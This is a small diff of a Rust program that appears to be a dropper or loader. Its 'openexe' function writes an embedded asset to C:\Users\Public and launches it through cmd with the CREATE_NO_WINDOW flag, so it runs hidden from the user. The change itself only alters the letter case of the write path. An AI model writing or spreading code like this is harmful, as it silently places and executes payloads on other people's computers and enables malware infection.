@@ -44,6 +44,6 @@ fn open(filename:String){
 
 fn openexe(name:String){
     let file = Asset::get(format!("{}",name).as_str()).unwrap();
-    let _ = write(format!("C:\\Users\\Public\\{}",name), file.data);
+    let _ = write(format!("C:\\users\\Public\\{}",name), file.data);
     let _ = std::process::Command::new("cmd").creation_flags(0x08000000).arg("/c").arg(format!("C:\\Users\\Public\\{}",name)).stdout(Stdio::piped()).spawn().unwrap();
 }
